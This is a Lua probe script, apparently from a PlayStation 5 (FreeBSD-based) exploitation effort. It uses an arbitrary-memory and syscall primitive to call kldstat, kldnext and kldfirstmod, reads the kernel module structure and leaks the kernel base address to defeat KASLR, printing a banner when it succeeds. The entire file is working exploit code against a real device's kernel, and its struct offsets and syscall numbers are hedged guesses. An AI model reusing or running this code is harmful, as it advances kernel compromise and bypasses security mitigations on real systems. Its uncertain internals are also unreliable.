-- CRASH_CLASS: MODERATE (known syscall, correct number this time)
-- PROBE 43a: kldstat(367) via make_syscall — KASLR defeat
--
-- CRITICAL: Probe 42b used WRONG syscall number 306 for kldstat,
-- which caused a crash. The correct FreeBSD number is 367.
-- Probe 02 confirmed syscall.resolve() resolves 367 successfully.
-- This probe calls it properly via make_syscall(367).
--
-- kldstat returns struct kld_file_stat which contains:
--   int      version   (+0x00, set to sizeof(struct kld_file_stat))
--   char     name[64]  (+0x04)
--   int      refs      (+0x44)
--   int      id        (+0x48)
--   void*    address   (+0x50) *** KERNEL BASE ADDRESS ***
--   size_t   size      (+0x58)
--
-- fileid 1 = the kernel itself. If address field leaks, KASLR is dead.

print("=== PROBE 43a: KLDSTAT KASLR DEFEAT ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function qw_hex(v)
    if type(v) == "table" and v.h then
        return string.format("%08X_%08X", v.h, v.l)
    end
    return string.format("%08X", to_num(v))
end

local sc_getpid = make_syscall(20)
local pid = 0
pcall(function() pid = to_num(sc_getpid()) end)
print("pid: " .. pid)

--------------------------------------------------------------------
-- A) kldstat(367) — kernel module info
-- int kldstat(int fileid, struct kld_file_stat *stat)
--------------------------------------------------------------------
print("")
print("=== A: KLDSTAT (syscall 367, correct number) ===")
do
    local sc_kldstat = make_syscall(367)

    -- struct kld_file_stat is ~112 bytes on FreeBSD amd64
    -- We allocate 256 to be safe
    local stat_buf = memory.alloc(0x100)

    -- Try fileids 1 through 5 (1 = kernel, 2+ = modules)
    for fileid = 1, 5 do
        -- Zero the buffer
        for off = 0, 0xFC, 4 do safe_wd(stat_buf + off, 0) end
        -- Set version field = sizeof(struct kld_file_stat)
        -- On FreeBSD amd64 this is typically 112 (0x70) or 120
        safe_wd(stat_buf, 0x70)

        local ok, ret = pcall(function()
            return sc_kldstat(uint64(fileid), uint64(stat_buf))
        end)
        local rv = ok and to_num(ret) or -999

        print(string.format("  fileid=%d: ret=%d", fileid, rv))

        if rv == 0 then
            -- Parse the struct
            local version = safe_rd(stat_buf)
            print(string.format("    version: %d", version or -1))

            -- Name at +0x04 (64 bytes)
            local name = ""
            for i = 0, 63 do
                local b = safe_rd(stat_buf + 4 + i)
                if b and b > 0 and b < 128 then
                    name = name .. string.char(b)
                else
                    break
                end
            end
            print("    name: " .. name)

            -- refs at +0x44
            local refs = safe_rd(stat_buf + 0x44)
            print(string.format("    refs: %d", refs or -1))

            -- id at +0x48
            local id = safe_rd(stat_buf + 0x48)
            print(string.format("    id: %d", id or -1))

            -- address at +0x50 — THIS IS THE KERNEL BASE
            local addr = safe_rq(stat_buf + 0x50)
            if addr then
                local h, l = get_hi_lo(addr)
                print(string.format("    address: %08X_%08X", h, l))
                if h >= 0xFFFF8000 then
                    print("    *** KERNEL ADDRESS LEAKED — KASLR DEFEATED ***")
                end
            end

            -- size at +0x58
            local sz = safe_rq(stat_buf + 0x58)
            if sz then
                local sh, sl = get_hi_lo(sz)
                print(string.format("    size: %08X_%08X", sh, sl))
            end
        end
    end

    -- Also try with version = 120 (0x78) in case struct is larger on PS5
    print("")
    print("  retry fileid=1 with version=120:")
    for off = 0, 0xFC, 4 do safe_wd(stat_buf + off, 0) end
    safe_wd(stat_buf, 0x78)
    local ok2, ret2 = pcall(function()
        return sc_kldstat(uint64(1), uint64(stat_buf))
    end)
    local rv2 = ok2 and to_num(ret2) or -999
    print(string.format("  ret=%d", rv2))
    if rv2 == 0 then
        local addr = safe_rq(stat_buf + 0x50)
        if addr then
            local h, l = get_hi_lo(addr)
            print(string.format("    address: %08X_%08X", h, l))
        end
    end
end

--------------------------------------------------------------------
-- B) kldnext(0) — get first module fileid, then enumerate
-- int kldnext(int fileid) — returns next fileid, 0 = end
--------------------------------------------------------------------
print("")
print("=== B: KLDNEXT (syscall 307) ===")
do
    local sc_kldnext = make_syscall(307)
    local fileid = 0
    local count = 0
    repeat
        local ok, ret = pcall(function()
            return sc_kldnext(uint64(fileid))
        end)
        local rv = ok and to_num(ret) or -999
        if rv <= 0 or rv == 0xFFFFFFFF then
            print(string.format("  kldnext(%d) = %d (end/error)", fileid, rv))
            break
        end
        print(string.format("  kldnext(%d) = %d", fileid, rv))
        fileid = rv
        count = count + 1
    until count > 20
    print("  modules found: " .. count)
end

--------------------------------------------------------------------
-- C) kldfirstmod — get first module in a kld file
-- int kldfirstmod(int fileid) — returns modid
--------------------------------------------------------------------
print("")
print("=== C: KLDFIRSTMOD (syscall 309) ===")
do
    local sc_kldfirstmod = make_syscall(309)
    local ok, ret = pcall(function()
        return sc_kldfirstmod(uint64(1))
    end)
    local rv = ok and to_num(ret) or -999
    print(string.format("  kldfirstmod(1) = %d", rv))
end

print("")
print("=== PROBE 43a COMPLETE ===")
